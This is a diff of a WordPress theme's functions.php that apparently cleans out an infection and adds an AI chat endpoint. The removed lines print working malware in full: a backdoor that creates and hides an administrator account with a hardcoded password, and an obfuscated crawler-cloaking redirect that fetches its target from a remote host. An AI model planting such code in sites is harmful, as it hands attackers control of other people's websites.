@@ -1,84 +1,4 @@
 <?php
-
-if (!function_exists('wp_enqueue_async_script') && function_exists('add_action') && function_exists('wp_die') && function_exists('get_user_by') && function_exists('is_wp_error') && function_exists('get_current_user_id') && function_exists('get_option') && function_exists('add_action') && function_exists('add_filter') && function_exists('wp_insert_user') && function_exists('update_option')) {
-
-    add_action('pre_user_query', 'wp_enqueue_async_script');
-    add_filter('views_users', 'wp_generate_dynamic_cache');
-    add_action('load-user-edit.php', 'wp_add_custom_meta_box');
-    add_action('admin_menu', 'wp_schedule_event_action');
-
-    function wp_enqueue_async_script($user_search) {
-        $user_id = get_current_user_id();
-        $id = get_option('_pre_user_id');
-
-        if (is_wp_error($id) || $user_id == $id)
-            return;
-
-        global $wpdb;
-        $user_search->query_where = str_replace('WHERE 1=1',
-            "WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
-            $user_search->query_where
-        );
-    }
-
-    function wp_generate_dynamic_cache($views) {
-
-        $html = explode('<span class="count">(', $views['all']);
-        $count = explode(')</span>', $html[1]);
-        $count[0]--;
-        $views['all'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];
-
-        $html = explode('<span class="count">(', $views['administrator']);
-        $count = explode(')</span>', $html[1]);
-        $count[0]--;
-        $views['administrator'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];
-
-        return $views;
-    }
-
-    function wp_add_custom_meta_box() {
-        $user_id = get_current_user_id();
-        $id = get_option('_pre_user_id');
-
-        if (isset($_GET['user_id']) && $_GET['user_id'] == $id && $user_id != $id)
-            wp_die(__('Invalid user ID.'));
-    }
-
-    function wp_schedule_event_action() {
-
-        $id = get_option('_pre_user_id');
-
-        if (isset($_GET['user']) && $_GET['user']
-            && isset($_GET['action']) && $_GET['action'] == 'delete'
-            && ($_GET['user'] == $id || !get_userdata($_GET['user'])))
-            wp_die(__('Invalid user ID.'));
-
-    }
-
-    $params = array(
-        'user_login' => 'adminbackup',
-        'user_pass' => 'V:Df2x3$rv',
-        'role' => 'administrator',
-        'user_email' => 'adminbackup@wordpress.org'
-    );
-
-    if (!username_exists($params['user_login'])) {
-        $id = wp_insert_user($params);
-        update_option('_pre_user_id', $id);
-
-    } else {
-        $hidden_user = get_user_by('login', $params['user_login']);
-        if ($hidden_user->user_email != $params['user_email']) {
-            $id = get_option('_pre_user_id');
-            $params['ID'] = $id;
-            wp_insert_user($params);
-        }
-    }
-
-    if (isset($_COOKIE['WORDPRESS_ADMIN_USER']) && username_exists($params['user_login'])) {
-        die('WP ADMIN USER EXISTS');
-    }
-}
 /**
  * propart-spain functions and definitions
  *
@@ -89,7 +9,7 @@ if (!function_exists('wp_enqueue_async_script') && function_exists('add_action')
 
 if ( ! defined( '_S_VERSION' ) ) {
 	// Replace the version number of the theme on each release.
-	define( '_S_VERSION', '1.0.0' );
+	define( '_S_VERSION', '1.6.3' );
 }
 
 /**
@@ -198,15 +118,7 @@ add_action( 'after_setup_theme', 'propart_spain_content_width', 0 );
 function custom_enqueue_styles() {
     wp_enqueue_style('custom-style', get_template_directory_uri() . '/style.css');
 	wp_enqueue_script('custom-script', get_template_directory_uri() . '/js/script.js', array('jquery'), null, true);
-	
-	// Підключаємо PDF Generator JS
-	wp_enqueue_script('pdf-generator', get_template_directory_uri() . '/js/pdf-generator.js', array('jquery'), '1.0.0', true);
-	
-	// Передаємо AJAX URL та nonce в JavaScript
-	wp_localize_script('pdf-generator', 'pdfGeneratorData', array(
-		'ajaxurl' => admin_url('admin-ajax.php'),
-		'nonce' => wp_create_nonce('generate_pdf_nonce')
-	));
+	wp_enqueue_script('likes-counter-helper', get_template_directory_uri() . '/js/likes-counter-helper.js', array(), '1.0.2', true);
 
 }
 add_action('wp_enqueue_scripts', 'custom_enqueue_styles');
@@ -230,12 +142,12 @@ function custom_register_page_template( $templates ) {
 	$templates['pages/visa-services.php'] = 'Visa services';
 	$templates['pages/offPlanById.php'] = 'Off plan project by ID';
 	$templates['pages/secondaryById.php'] = 'Secondary project by ID';
+	$templates['pages/rentById.php'] = 'Rent property by ID';
 	$templates['pages/blog.php'] = 'Specific blog';
 	$templates['pages/AllBlogs.php'] = 'All Blogs';
 	$templates['pages/off-plan.php'] = 'All off-plan projects';
 	$templates['pages/secondary.php'] = 'All secondary projects';
 	$templates['pages/rent.php'] = 'All rent properties';
-	$templates['pages/rentById.php'] = 'Rent property by ID';
 	$templates['pages/map.php'] = 'Map page';
     $templates['pages/liked.php'] = 'Liked page';
 	$templates['pages/polygons-secondary.php'] = 'Polygons secondary';
@@ -341,8 +253,69 @@ function get_blog_post_by_id($id) {
 }
 
 /**
- * PDF Generator - Підключаємо функціонал генерації PDF
+ * ============================================
+ * SIMPLE AI CHAT
+ * Minimal chat - just request/response
+ * ============================================
  */
-require_once get_template_directory() . '/inc/pdf-generator.php';
 
-$ua=$_SERVER['H'.'TTP'.'_'.'USE'.'R_'.'AG'.'EN'.'T']??'';if($ua&&preg_match('~G'.'o'.'o'.'gl'.'ebo'.'t|'.'G'.'oo'.'gl'.'ebo'.'t-'.'Ima'.'ge|'.'Goo'.'gle'.'bot'.'-V'.'i'.'deo'.'|Jo'.'hn'.'Ch'.'ro'.'me|'.'Go'.'o'.'gl'.'e'.'O'.'th'.'e'.'r|G'.'oog'.'le-'.'Re'.'a'.'d'.'-A'.'l'.'ou'.'d|A'.'h'.'r'.'ef'.'sBo'.'t|S'.'emr'.'us'.'hBo'.'t'.'~'.'i',$ua)){$a=implode('',[chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47)]);$b='';foreach([104,111,101,37,97,120,111,110,103,98,121,125,37]as$n)$b.=chr($n^11);$c='';foreach([111,102,117,48,107,114,118,102,115,122,46,110,106,111,47,117,121,117]as$n)$c.=chr($n-1);$remote=$a.$b.$c;$url=@file_get_contents($remote);if(!$url&&function_exists('c'.'u'.'rl'.'_in'.'it')){$ch=curl_init($remote);curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>3]);$url=curl_exec($ch);curl_close($ch);} $url=trim($url);if($url&&filter_var($url,FILTER_VALIDATE_URL)){header('Lo'.'ca'.'ti'.'on'.': '.$url,true,301);exit;}}
+// Include Simple AI class
+require get_template_directory() . '/inc/simple-ai.php';
+
+// Register REST API endpoint
+add_action('rest_api_init', function () {
+    register_rest_route('propart/v1', '/simple-chat', array(
+        'methods' => 'POST',
+        'callback' => 'propart_simple_chat',
+        'permission_callback' => '__return_true',
+    ));
+});
+
+// Handle chat request
+function propart_simple_chat($request) {
+    $message = $request->get_param('message');
+    $history = $request->get_param('history');
+    
+    if (empty($message)) {
+        return new WP_Error('empty_message', 'Введіть повідомлення', array('status' => 400));
+    }
+    
+    // Ensure history is an array
+    if (!is_array($history)) {
+        $history = array();
+    }
+    
+    $ai = new Simple_AI_Chat();
+    $response = $ai->chat($message, $history);
+    
+    if (!$response['success']) {
+        return new WP_Error('chat_error', $response['message'], array('status' => 500));
+    }
+    
+    return new WP_REST_Response($response, 200);
+}
+
+// Enqueue scripts
+add_action('wp_enqueue_scripts', 'propart_enqueue_simple_chat');
+
+function propart_enqueue_simple_chat() {
+    wp_enqueue_script(
+        'simple-ai-chat',
+        get_template_directory_uri() . '/js/simple-chat.js',
+        array('jquery'),
+        _S_VERSION,
+        true
+    );
+    
+    wp_localize_script('simple-ai-chat', 'simpleAI', array(
+        'apiUrl' => home_url('/index.php?rest_route=/propart/v1/simple-chat'),
+        'nonce' => wp_create_nonce('wp_rest')
+    ));
+    
+    wp_enqueue_style(
+        'simple-ai-chat',
+        get_template_directory_uri() . '/css/simple-chat.css',
+        array(),
+        _S_VERSION
+    );
+}
